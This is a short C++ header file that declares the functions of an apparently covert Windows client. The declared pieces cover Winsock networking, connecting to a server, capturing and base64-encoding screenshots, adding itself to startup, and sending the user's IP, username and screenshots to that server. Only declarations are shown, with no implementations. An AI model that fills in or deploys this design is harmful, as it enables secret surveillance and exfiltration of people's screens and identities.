#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <bitset>

#pragma once

#include "..\inc\captureScreen.h"
#include "..\inc\addToStartup.h"

std::vector <BYTE> base64_decode(const std::string &encoded);

std::string base64_encode(const std::vector<unsigned char> &data);

void initWinsock();

SOCKET connectToServer(const std::string &serverIp, int port);

bool sendActivity(SOCKET clientSocket, const std::string &ip, const std::string &username,
                  const std::vector <BYTE> &screenshotData);

std::string captureScreenAndEncode();

DWORD WINAPI
sendClientActivity(LPVOID
param);